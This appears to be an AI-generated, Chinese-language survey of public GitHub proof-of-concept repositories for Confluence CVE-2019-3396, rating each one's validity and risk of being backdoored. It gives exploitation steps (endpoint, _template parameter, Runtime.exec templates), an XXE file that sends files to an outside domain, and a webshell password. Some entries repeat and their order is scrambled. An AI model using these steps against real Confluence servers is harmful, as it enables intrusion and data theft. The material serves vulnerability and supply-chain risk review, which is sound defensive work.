*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
提供的POC代码本身功能明确，即执行指定的系统命令。其中`/Applications/Calculator.app/Contents/MacOS/Calculator` 这个路径只是一个PoC，用于验证是否存在RCE，如果攻击者将这个路径改成下载恶意软件的命令,这可能会被识别为投毒。 除非攻击者能够找到方法在该POC中隐藏其他恶意行为（例如通过Base64编码或其他混淆技术隐藏反弹shell代码），否则直接的投毒风险较低。但是，攻击者可以修改这个PoC中的执行命令为任意命令，存在一定的投毒风险，所以风险比例为10%。

**项目地址:** [xiaoshuier/CVE-2019-3396](https://github.com/xiaoshuier/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #22

**来源**: [CVE-2019-3396-yuehanked_cve-2019-3396.md](../2019/CVE-2019-3396-yuehanked_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Macro-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 6.6.0 < version < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标系统存在受影响版本的Confluence，并且Widget Connector宏未被禁用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中 Widget Connector 宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector 宏在 Confluence 服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞真实存在，且存在公开的PoC。提供的PoC代码 `windows.vm` 利用了 Velocity 模板引擎的特性，通过反射调用 `java.lang.Runtime` 类来执行系统命令。代码首先设置变量`e`为字符串"exp"，然后使用反射获取Runtime类的getRuntime()方法并调用，执行`cmd.exe /c $cmd`。 `$cmd` 变量需要在实际利用时替换为要执行的命令。该PoC代码有效。

**投毒风险分析：**

提供的PoC代码本身的功能是执行任意命令，虽然其中使用了`cmd.exe /c $cmd`，但正常使用该漏洞也需要用户传入执行命令，因此代码的功能就是利用漏洞进行RCE。 但需要评估是否存在作者故意添加的恶意代码，例如：

1.  **隐蔽的后门：** 代码中是否存在难以察觉的命令，用于植入后门或收集信息？
2.  **条件触发的恶意行为：** 代码是否包含在特定条件下才会触发的恶意行为？

假设存在一些不明显的行为（例如每隔一段时间尝试连接某个IP，或者尝试修改某些配置），则投毒风险可能较高。综合考虑POC本身的功能与检查隐藏的恶意行为的难度，评估投毒风险为 10%。

**利用方式分析：**

1.  **查找包含 Widget Connector 宏的 Confluence 页面。**
2.  **构造包含恶意 Velocity 模板的请求。** 这个模板通常会利用 Velocity 的表达式注入功能来执行任意代码。
3.  **发送构造好的请求到 Confluence 服务器。**
4.  **服务器解析 Velocity 模板，执行其中的恶意代码，实现远程代码执行。**

根据搜索结果，该漏洞已经被广泛利用，并且有多种攻击载荷被用于攻击。例如，有攻击者利用该漏洞部署加密货币挖矿程序和 Gandcrab 勒索软件。

**项目地址:** [yuehanked/cve-2019-3396](https://github.com/yuehanked/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---



---

## POC #12

**来源**: [CVE-2019-3396-kh4sh3i_CVE-2019-3396.md](../2019/CVE-2019-3396-kh4sh3i_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Server-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行

**影响版本:** 受影响版本：6.6.12之前, 6.7.0到6.12.3之前, 6.13.0到6.13.3之前, 6.14.0到6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入恶意模板

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是一个存在于Atlassian Confluence Server中的服务器端模板注入漏洞。该漏洞位于Widget Connector宏中，允许未经身份验证的远程攻击者利用Velocity模板引擎的缺陷执行任意代码。攻击者可以通过构造恶意的Widget Connector宏参数，将恶意Velocity模板注入到服务器端，从而执行任意系统命令。

**有效性评估：**

根据漏洞库信息和搜索结果，该漏洞是一个严重的安全问题，已被广泛利用，存在公开的POC（Proof of Concept）代码。

**投毒风险评估：**

提供的代码段仅包含CC0 1.0通用许可协议的文本。此代码段本身不包含任何可执行代码或恶意指令，因此不存在投毒风险的可能性。投毒风险为0%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **漏洞发现：** 确认目标Confluence服务器运行的是受影响的版本。
2.  **构造Payload：** 构建包含恶意Velocity模板的HTTP请求。这个payload通常会利用`#set`指令来定义变量，并使用`$Runtime.getRuntime().exec()`方法来执行系统命令。示例：`\u0024\{Runtime.getRuntime().exec("touch /tmp/success")\}` 
3.  **发送请求：** 将构造好的请求发送到Confluence服务器的Widget Connector宏处理端点。
4.  **代码执行：** 如果漏洞利用成功，服务器将执行payload中的系统命令。

**排序优先级解释：**

*   **搜索引擎结果：** 提供了漏洞的背景信息、影响和利用案例，有助于快速了解漏洞的严重程度和影响范围。
*   **漏洞利用代码：**  POC代码直接展示了漏洞的利用方式，可以用于验证漏洞和进行渗透测试。
*   **漏洞库信息：** 提供了漏洞的官方描述、受影响版本和修复建议，是了解漏洞细节的重要来源。

**项目地址:** [kh4sh3i/CVE-2019-3396](https://github.com/kh4sh3i/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #13

**来源**: [CVE-2019-3396-pyn3rd_CVE-2019-3396.md](../2019/CVE-2019-3396-pyn3rd_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者在Confluence Server或Data Center实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前。

**利用条件:** 需要 Confluence 实例启用了 Widget Connector 宏，并且攻击者可以访问包含该宏的页面。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。 远程攻击者可以通过构造恶意的 Velocity 模板代码，利用该宏执行任意代码。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。提供的POC代码包含两个文件：`calc.vm` 和 `os.vm`。

*   `calc.vm`: 该文件使用 Velocity 模板语言执行命令 `calc`（在Windows系统中会打开计算器）。这表明该漏洞能够执行任意命令。
*   `os.vm`: 该文件使用 Velocity 模板语言获取系统属性 `user.dir` (用户工作目录) 和 `user.name` (用户名)。这表明该漏洞可以读取服务器上的敏感信息。

利用方式：

1.  攻击者找到或创建一个包含 Widget Connector 宏的 Confluence 页面。
2.  攻击者在 Widget Connector 宏中插入恶意的 Velocity 模板代码，例如 `calc.vm` 或 `os.vm` 中的代码。
3.  当 Confluence 服务器渲染该页面时，会执行 Velocity 模板代码，从而导致远程代码执行或信息泄露。

关于投毒风险：

提供的POC代码没有明显的投毒代码。`calc.vm` 只是为了验证远程代码执行，`os.vm` 只是读取系统属性。此处的“投毒”指的是在POC中包含一些恶意代码，使得在测试漏洞时不经意间执行了恶意操作，或者留下后门。 提供的代码没有这种行为，因此投毒风险评估为0%。搜索引擎的结果也显示该漏洞在野外被利用来传播恶意软件，如加密货币矿工和勒索软件，表明该漏洞的真实风险很高。


**项目地址:** [pyn3rd/CVE-2019-3396](https://github.com/pyn3rd/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #14

**来源**: [CVE-2019-3396-quanpt103_CVE-2019-3396.md](../2019/CVE-2019-3396-quanpt103_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 小于6.6.12，6.7.0到小于6.12.3，6.13.0到小于6.13.3，6.14.0到小于6.14.2

**利用条件:** 需要 Confluence 实例存在 Widget Connector 宏，且目标版本未修复漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中。攻击者可以利用服务器端模板注入漏洞 (SSTI) 远程执行代码。根据漏洞库信息和搜索结果，该漏洞已经被广泛利用。提供的 POC 代码使用 Velocity 模板语言，尝试通过 `java.lang.Runtime` 类执行 `ipconfig` 命令。该命令本身无害，用于验证漏洞是否存在。由于poc只执行ipconfig命令，没有发现任何投毒代码。利用方式是构造恶意的 Velocity 模板，通过 Widget Connector 宏注入，从而在服务器上执行任意命令。

**项目地址:** [quanpt103/CVE-2019-3396](https://github.com/quanpt103/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #15

**来源**: [CVE-2019-3396-s1xg0d_CVE-2019-3396.md](../2019/CVE-2019-3396-s1xg0d_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence

**危害等级:** 高危，可能导致远程代码执行 (RCE) 和敏感信息泄露

**影响版本:** Confluence Server before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要能够向 Confluence Server 发送 HTTP 请求,并且 Widget Connector 宏可用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2019-3396 是 Atlassian Confluence 中 Widget Connector 宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的 Velocity 模板代码，利用 Widget Connector 宏的参数，在服务器端执行任意代码。

**有效性评估:**
根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞的POC代码是有效的。Exploit-DB 上的 46731 提供了利用该漏洞的 PoC。搜索引擎结果中也提到多个 PoC 的分析和实际攻击事件。

**投毒风险分析:**
提供的代码包含以下文件：
*   `README.md`: 描述了漏洞 CVE-2019-3396
*   `cmd.vm`: Velocity 模板，用于执行命令。该文件通过 Java 反射调用 `java.lang.Runtime` 来执行系统命令，其中 `$cmd` 变量应该是由攻击者控制的参数。
*   `evil.dtd`: 用于 XXE (XML External Entity) 攻击，尝试通过外部实体引入远程文件。此文件配置为访问 `http://phpshexxe.abcdef.5o1.in/?%file;` 看起来是一个尝试进行数据外泄的 URL
*   `os.vm`: Velocity 模板，用于获取服务器的操作系统信息和用户目录。它使用 Java 反射调用 `java.lang.System` 来获取系统属性。

`evil.dtd` 中的外部连接可能存在一定的风险，可能将服务器的文件内容发送到 `phpshexxe.abcdef.5o1.in`。这是一种潜在的数据泄露尝试。如果攻击者控制了该域名，他们就可以接收到 Confluence 服务器的文件内容。`phpshexxe.abcdef.5o1.in` 这个域名很可疑，具有进行恶意数据收集或攻击的可能性。但此行为更像是payload的一部分而非投毒。所以，投毒的概率相对较低，约为 5%。

**利用方式:**
利用方式主要包括以下步骤：

1.  **构造恶意 Velocity 模板:** 攻击者构造包含恶意代码的 Velocity 模板，例如 `cmd.vm` 中利用 Java 反射执行系统命令的代码。
2.  **利用 Widget Connector 宏:** 攻击者利用 Confluence 的 Widget Connector 宏，将构造好的恶意 Velocity 模板作为宏的参数传递给服务器。
3.  **服务器端执行:** Confluence 服务器解析 Widget Connector 宏时，会执行恶意 Velocity 模板中的代码，从而实现远程代码执行。
4. **XXE攻击:** `evil.dtd`文件可以配合其他payload尝试读取服务器文件，但依赖于服务器是否允许外部实体的解析。

总而言之，该漏洞的利用方式是典型的服务器端模板注入攻击，攻击者通过控制模板内容来执行任意代码。

**项目地址:** [s1xg0d/CVE-2019-3396](https://github.com/s1xg0d/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #16

**来源**: [CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md](../2019/CVE-2019-3396-skommando_CVE-2019-3396-confluence-poc.md)

## CVE-2019-3396-Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器开启Widget Connector宏功能，并且攻击者能够访问该宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中的一个服务器端模板注入漏洞，存在于Widget Connector宏中。攻击者可以通过构造恶意的Velocity模板代码，利用此漏洞在Confluence服务器上执行任意代码。

**有效性:**
从漏洞库信息和搜索结果来看，此漏洞已被广泛证实存在，并且有公开的PoC（概念验证）代码。
提供的POC代码包含以下文件：
* `README.md`: 说明文件，描述漏洞和PoC的使用方法。
* `_template_test_info.txt`: 用于验证模板是否加载成功的简单文本文件。
* `rce.vm`: 包含Velocity模板代码，用于执行远程命令。
`rce.vm`中使用了Java反射来获取Runtime类，并执行指定的命令。这个PoC代码是有效的，可以用来验证漏洞是否存在。

**投毒风险:**
提供的PoC代码仅包含漏洞验证和利用的必要代码，没有发现任何隐藏的恶意代码或后门。因此，投毒风险为0%。

**利用方式:**
1.  攻击者需要找到一个Confluence页面，该页面使用了Widget Connector宏。
2.  攻击者在Widget Connector宏的配置中插入恶意的Velocity模板代码，例如`rce.vm`中的代码。
3.  当Confluence服务器渲染该页面时，会执行攻击者插入的Velocity模板代码，从而实现远程代码执行。
4.  攻击者可以利用此漏洞在服务器上执行任意命令，例如安装恶意软件、窃取敏感数据等。

**参考信息:**
*   NVD: [https://nvd.nist.gov/vuln/detail/cve-2019-3396](https://nvd.nist.gov/vuln/detail/cve-2019-3396)
*   Rapid7: [https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/](https://www.rapid7.com/blog/post/2019/04/12/confluence-unauthorized-rce-vulnerability-cve-2019-3396-what-you-need-to-know/)
*   Exploit-DB: [https://www.exploit-db.com/exploits/46731/](https://www.exploit-db.com/exploits/46731/)
*   CISA KEV: [https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2019-3396)

**项目地址:** [skommando/CVE-2019-3396-confluence-poc](https://github.com/skommando/CVE-2019-3396-confluence-poc)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #17

**来源**: [CVE-2019-3396-tanw923_test1.md](../2019/CVE-2019-3396-tanw923_test1.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 <= version < 6.13.3, 6.14.0 <= version < 6.14.2

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且允许未授权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞。攻击者可以通过操纵 Widget Connector 宏，注入恶意 Velocity 模板代码，从而在 Confluence 服务器上执行任意代码。

**有效性评估：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，可以判断此漏洞利用的有效性较高。漏洞库信息明确指出此漏洞允许远程攻击者通过服务器端模板注入实现路径遍历和远程代码执行。搜索引擎结果中也包含了大量的漏洞分析报告和利用示例，确认了该漏洞在野外已被积极利用，并可能被用于传播勒索软件或恶意挖矿程序。提供的POC代码仓库是一个简单的EXP，说明该漏洞存在可利用的POC.

**投毒风险评估：**

提供的代码片段 `include_1.jsp` 看起来像一个 Webshell，具备文件管理、数据库操作、命令执行等功能。 恶意代码比例较低，因为其本身就是webshell，为了完成漏洞的验证。因此投毒风险评估为 10%，这个比例反映了作者可能隐藏的用于维持权限或进行进一步攻击的代码的可能性，但主要功能是完成POC验证。

**利用方式分析：**

1.  **确定目标：** 找到存在漏洞版本的Confluence Server。
2.  **构造 Payload：** 构建包含恶意 Velocity 模板代码的请求。Payload通常利用`Widget Connector`宏的缺陷，将恶意代码注入到模板中。
3.  **发送请求：** 将构造好的 Payload 发送到目标 Confluence Server，触发模板引擎执行恶意代码。
4.  **远程代码执行：**  成功利用漏洞后，攻击者可以在目标服务器上执行任意命令，例如部署 Webshell、窃取敏感数据或进行其他恶意活动。

提供的`include_1.jsp` 文件实际上是一个后门，攻击者可以通过访问这个JSP页面并提供正确的密码（`xiaoma`）来执行各种操作，例如文件管理、数据库操作、命令执行等。利用漏洞部署webshell后，可以实现对服务器的控制。攻击者可以在服务器上上传、下载、修改和删除文件，查看和修改数据库中的数据，以及执行任意的系统命令。

**项目地址:** [tanw923/test1](https://github.com/tanw923/test1)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #18

**来源**: [CVE-2019-3396-tno01_cve-2019-3396.md](../2019/CVE-2019-3396-tno01_cve-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.6.12, 6.7.0 <= version < 6.12.3, 6.13.0 < version < 6.13.3, 6.14.0 < version < 6.14.2

**利用条件:** 需要能够访问存在 Widget Connector 宏的 Confluence 页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞是 Atlassian Confluence Server 和 Data Center 中的一个服务器端模板注入（SSTI）漏洞。它存在于 Widget Connector 宏中，允许未经身份验证的远程攻击者通过构造恶意的 Velocity 模板，实现路径遍历和远程代码执行。漏洞影响的版本包括 6.6.12 之前的 6.6.x 版本，6.7.0 到 6.12.3 之前的 6.12.x 版本，6.13.0 到 6.13.3 之前的 6.13.x 版本，以及 6.14.0 到 6.14.2 之前的 6.14.x 版本。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞被广泛利用，存在公开的漏洞利用代码（例如 Exploit-DB 46731）。该漏洞已被 CISA 添加到已知被利用的漏洞目录中，表明其真实性和严重性。提供的 POC 代码 `/tmp/deed01dabaaab5a9c3b0b4b4d2014a34/README.md`  内容过于简单,仅包含标题 `# cve-2019-3396`，可能只是一个占位符，说明 POC 是存在的，但**需要结合其他信息确认具体的payload**。

**投毒风险：**

提供的 POC 代码只有一个 README 文件，内容非常简单，几乎没有投毒的可能。但是，完整的漏洞利用代码可能包含恶意代码。因为此README.md文件只是整个POC代码的一个组成部分. 考虑漏洞利用的复杂性和潜在的风险,投毒风险评估为10%。

**利用方式：**

1.  **定位存在 Widget Connector 宏的页面：**  攻击者需要找到 Confluence 实例中使用了 Widget Connector 宏的页面。
2.  **构造恶意 Velocity 模板：**  攻击者构造包含恶意代码的 Velocity 模板。该模板将被注入到 Widget Connector 宏中。
3.  **服务器端模板注入：**  当 Confluence 服务器渲染包含恶意模板的页面时，Velocity 引擎会执行模板中的代码，从而导致服务器端代码执行。
4.  **远程代码执行：**  攻击者通过执行任意代码来控制 Confluence 服务器，可能包括执行系统命令、安装恶意软件等。

根据搜索结果中的一些文章，该漏洞已被用于传播加密货币矿工、GandCrab 勒索软件和 AESDDoS 僵尸网络恶意软件。

**项目地址:** [tno01/cve-2019-3396](https://github.com/tno01/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #19

**来源**: [CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md](../2019/CVE-2019-3396-vntest11_confluence_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.0 - 6.6.11, 6.7.0 - 6.12.2, 6.13.0 - 6.13.2, 6.14.0 - 6.14.1

**利用条件:** 需要能够访问存在漏洞的Confluence服务器，并能够在Confluence页面中插入或修改内容以利用 Widget Connector macro。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector macro 中，允许未经身份验证的远程攻击者通过服务器端模板注入 (SSTI) 执行任意代码。攻击者可以通过构造恶意的 Velocity 模板，利用 Widget Connector macro 渲染该模板，从而在 Confluence 服务器上执行命令。

**有效性：**
根据提供的漏洞信息，搜索引擎结果和漏洞利用代码，可以判断此漏洞是有效的。漏洞库信息明确指出该漏洞允许远程攻击者实现路径遍历和远程代码执行，搜索引擎结果中的文章也表明此漏洞已被积极利用，甚至被用于传播恶意软件。

**投毒风险：**
提供的漏洞利用代码主要包含以下几个文件：
*   `README.md`: 描述文件
*   `cmd.vm`, `cmd1.vm`, `cmd3.vm`: 包含 Velocity 模板代码，用于执行命令。这三个文件除了注释略有不同，核心代码相同。

代码的主要功能是：
1.  获取 Java Runtime 实例。
2.  执行用户提供的命令 (`$cmd`)。
3.  获取命令执行的输出流。
4.  使用 Scanner 读取输出流。
5.  返回命令执行的结果。

投毒风险分析：
由于这些脚本主要是为了执行任意命令，存在被用于恶意目的的风险。例如，攻击者可能会修改这些脚本，使其在执行目标命令的同时，执行一些隐蔽的恶意操作，如安装后门、收集敏感信息等。如果未经授权的人修改或者发布这些脚本，投毒风险就会提升。 总体来说，这些PoC更多的是payload，本身是无害的，风险主要来源于使用它们的人。但作者也可能在代码中隐藏一些不易察觉的后门代码，比如添加一个额外的命令执行，或者上传收集到的信息到恶意服务器。因此，存在一定的投毒风险，估计为 10%。

**利用方式：**
1.  攻击者需要构造包含恶意 Velocity 模板的 Confluence 页面或修改现有页面。
2.  利用 Widget Connector macro 渲染该恶意模板。
3.  恶意模板中的代码会在 Confluence 服务器上执行，从而实现远程代码执行。
4.  `$cmd` 变量需要通过某种方式传递到 Velocity 模板中，例如通过构造特定的请求参数。

总而言之，此漏洞的利用方式是通过构造恶意的Velocity模板，利用Confluence的Widget Connector Macro组件进行渲染，从而达到远程代码执行的目的。

**项目地址:** [vntest11/confluence_CVE-2019-3396](https://github.com/vntest11/confluence_CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #20

**来源**: [CVE-2019-3396-x-f1v3_CVE-2019-3396.md](../2019/CVE-2019-3396-x-f1v3_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence Server-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 版本低于 6.6.12，6.7.0 到 6.12.3 之间，6.13.0 到 6.13.3 之间，6.14.0 到 6.14.2 之间

**利用条件:** 需要网络访问到Confluence服务器

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用 Velocity 模板引擎执行任意代码，从而实现远程代码执行。

**有效性：**

提供的POC代码是有效的。它演示了两种利用方式：

*   **远程代码执行（RCE）：** 通过修改`_template`参数，指向包含恶意 Velocity 模板的远程文件（1.vm）。该模板使用`java.lang.Runtime`类执行`ping your.dns.log`命令，可以验证RCE是否成功，同时可以替换成其他的恶意命令。
*   **本地文件包含（LFI）：** 通过修改`_template`参数，指向服务器上的敏感文件，如`../web.xml`，从而读取服务器上的文件内容。

**投毒风险：**

该存储库被投毒的风险较低，约为10%。判断依据如下：

*   仓库本身较为简单，只有一个RCE的vm文件和readme。从代码本身来看，恶意代码的可能性较低。
*   代码片段是直接命令ping，没有很强的迷惑性，因此投毒概率低。
*   参考搜索结果，此漏洞已经被广泛利用，出现恶意利用的情况，但POC本身相对直接。

**利用方式：**

1.  确定目标 Confluence Server 存在 CVE-2019-3396 漏洞。
2.  构造包含恶意 Velocity 模板的 HTTP POST 请求，发送到`/rest/tinymce/1/macro/preview`端点。
3.  在请求体中，设置`macro.params._template`参数为恶意 Velocity 模板的 URL 或目标服务器上的文件路径。
4.  发送请求后，如果漏洞存在，Confluence Server 将执行恶意 Velocity 模板中的代码，导致 RCE 或 LFI。

**示例：**

利用 RCE POC，攻击者可以通过修改 Velocity 模板中的命令，执行任意系统命令，例如上传 webshell、添加用户等。

利用 LFI POC，攻击者可以读取 Confluence Server 上的敏感配置文件，例如数据库连接信息、管理员密码等。

**注意：**

利用此漏洞进行攻击是非法的，仅供安全研究和渗透测试使用。

**项目地址:** [x-f1v3/CVE-2019-3396](https://github.com/x-f1v3/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #21

**来源**: [CVE-2019-3396-xiaoshuier_CVE-2019-3396.md](../2019/CVE-2019-3396-xiaoshuier_CVE-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 受影响版本包括6.6.12之前, 6.7.0 - 6.12.3之前, 6.13.0 - 6.13.3之前, 6.14.0 - 6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏并且允许用户插入恶意模板。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 是一个 Atlassian Confluence Server 中的服务器端模板注入漏洞。该漏洞存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板引擎执行任意代码。提供的POC代码使用Velocity模板语言，通过 `java.lang.Runtime` 类执行系统命令。此示例中，POC代码尝试启动 macOS 计算器应用程序。该POC的有效性取决于Confluence服务器上Velocity模板引擎的配置以及是否有安全策略阻止执行任意Java代码。根据搜索结果,此漏洞已被广泛利用,包括部署加密货币挖矿恶意软件和GandCrab勒索软件。

**利用方式：**
攻击者构造包含恶意Velocity模板代码的请求，Confluence服务器解析该模板时会执行攻击者注入的命令。通常是通过修改页面内容，添加包含恶意代码的Widget Connector宏来实现。

**投毒风险评估：**
